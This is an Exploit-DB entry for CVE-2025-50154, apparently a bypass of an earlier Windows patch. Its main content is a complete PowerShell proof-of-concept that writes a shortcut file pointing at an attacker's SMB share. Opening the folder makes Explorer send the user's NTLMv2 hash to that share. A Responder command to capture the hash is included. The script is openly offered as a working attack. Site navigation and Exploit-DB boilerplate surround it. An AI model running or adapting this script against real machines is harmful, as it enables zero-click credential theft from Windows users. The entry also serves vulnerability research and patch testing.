---
title: [remote] Microsoft Windows 10.0.19045 - NTLMv2 Hash Disclosure
url: https://www.exploit-db.com/exploits/52415
source: Exploit-DB.com RSS Feed
date: 2025-08-19
fetch_date: 2025-10-07T00:16:14.748823
---

# [remote] Microsoft Windows 10.0.19045 - NTLMv2 Hash Disclosure

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Microsoft Windows 10.0.19045 - NTLMv2 Hash Disclosure

#### EDB-ID:

###### 52415

#### CVE:

###### [2025-50154](https://nvd.nist.gov/vuln/detail/CVE-2025-50154)

---

**EDB Verified:**

#### Author:

###### [Ruben Enkaoua](/?author=12311)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

###### 2025-08-18

---

**Vulnerable App:**

```
# Exploit Title: Microsoft Windows 10.0.19045 - NTLMv2 Hash Disclosure
# Date: 13/08/2025
# Exploit Author: Ruben Enkaoua
# Author link: https://x.com/RubenLabs, https://github.com/rubenformation
# Original Blog: https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/
# Vendor Homepage: https://microsoft.com
# Software Link: https://www.microsoft.com/en-us/software-download
# Version: All versions prior to patch tuesday august 2025
# Tested on: Windows 10.0.19045
# CVE : CVE-2025-50154
# This exploit if for CVE-2025-24054 Patch Bypass

# Start a responder with:
# responder -I <interface> -v

<#
.SYNOPSIS
    Creates a malicious LNK file that triggers SMB NTLMv2-SSP hash disclosure.
    This code is for educational and research purposes only.
    The author takes no responsibility for any misuse of this code.
.DESCRIPTION
    This script generates a .LNK shortcut pointing to a remote
SMB-hosted binary file.
    The shortcut uses a default Windows icon (SHELL32.dll) but still
forces Explorer to
    fetch the PE icon from the remote binary, triggering authentication.
.PARAMETER path
    Local path where the LNK file will be saved (e.g., C:\Users\User\Desktop).
.PARAMETER ip
    IP address or hostname of the remote SMB server hosting the binary.
.PARAMETER share
    The shared folder on the SMB server where the binary is stored.
.PARAMETER file
    The name of the binary file (e.g., payload.exe).
.EXAMPLE
    .\poc.ps1 -path "C:\Temp" -ip "192.168.1.10" -share "malware"
-file "payload.exe"
#>

param(
    [Parameter(Mandatory=$true)]
    [string]$path,    # -path
    [Parameter(Mandatory=$true)]
    [string]$ip,      # -ip
    [Parameter(Mandatory=$true)]
    [string]$share,   # -share
    [Parameter(Mandatory=$true)]
    [string]$file     # -file
)

# Build file paths
$shortcutPath = Join-Path $path "poc.lnk"
$targetPath = "\\$ip\$share\$file"
$iconLocation = "C:\Windows\System32\SHELL32.dll"

# Create LNK file
$wShell = New-Object -ComObject WScript.Shell
$shortcut = $wShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $targetPath
$shortcut.IconLocation = $iconLocation
$shortcut.Save()

Write-Output "Shortcut created at: $shortcutPath"
Write-Output "Target path: $targetPath"
```

**Tags:**

**Advisory/Source:**
[Link](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-50154)

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc...